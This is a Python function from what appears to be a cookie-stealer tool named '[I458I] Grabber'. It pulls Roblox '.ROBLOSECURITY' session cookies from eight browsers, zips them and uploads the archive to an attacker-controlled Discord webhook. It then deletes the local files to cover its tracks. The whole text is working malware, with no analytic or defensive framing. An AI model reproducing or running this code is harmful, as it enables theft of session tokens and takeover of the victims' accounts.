def roblos():
 coc = []
 try:
  sec = browser_cookie3.chrome(domain_name="roblox.com")
  for cookie in sec:
   if cookie.name == '.ROBLOSECURITY':
    coc.append(cookie.value)
 except:pass
 try:
  sec = browser_cookie3.chromium(domain_name="roblox.com")
  for cookie in sec:
   if cookie.name == '.ROBLOSECURITY':
    coc.append(cookie.value)
 except:pass
 try:
  sec = browser_cookie3.edge(domain_name="roblox.com")
  for cookie in sec:
   if cookie.name == '.ROBLOSECURITY':
    coc.append(cookie.value)
 except:pass
 try:
  sec = browser_cookie3.brave(domain_name="roblox.com")
  for cookie in sec:
   if cookie.name == '.ROBLOSECURITY':
    coc.append(cookie.value)
 except:pass
 try:
  sec = browser_cookie3.opera_gx(domain_name="roblox.com")
  for cookie in sec:
   if cookie.name == '.ROBLOSECURITY':
    coc.append(cookie.value)
 except:pass
 try:
  sec = browser_cookie3.safari(domain_name="roblox.com")
  for cookie in sec:
   if cookie.name == '.ROBLOSECURITY':
    coc.append(cookie.value)
 except:pass
 try:
  sec = browser_cookie3.firefox(domain_name="roblox.com")
  for cookie in sec:
   if cookie.name == '.ROBLOSECURITY':
    coc.append(cookie.value)
 except:pass
 try:
  sec = browser_cookie3.opera(domain_name="roblox.com")
  for cookie in sec:
   if cookie.name == '.ROBLOSECURITY':
    coc.append(cookie.value)
 except:pass
 if coc == []:
      xs = DiscordWebhook(url=wbz, username="[I458I] Grabber.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
      ys = DiscordEmbed(title=":no_entry_sign: **No roblox cookies found.**")
      ys.add_embed_field(name="**No cookies fetched**", value="")
      xs.add_embed(ys)
      xs.execute()
 else:pass
 if coc != []:
  with open("Cookies.txt", 'w') as GreenFN:
    for items in coc:
     GreenFN.write(f"{items}\n")
  with zipfile.ZipFile("Cookies.zip", 'w') as BrickFN:
      BrickFN.write("Cookies.txt")
  with open("Cookies.zip", 'rb') as file:
      data = {
         "username": "[I458I] Grabber.",
         "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
         }
      files = {
       "file": ("Cookies.zip", file, "application/zip")
       }
      requests.post(wbz, data=data, files=files)
 try:
  os.remove("Cookies.txt")
  os.remove("Cookies.zip")
  os.remove(BrickFN)
  os.remove(GreenFN)
 except:pass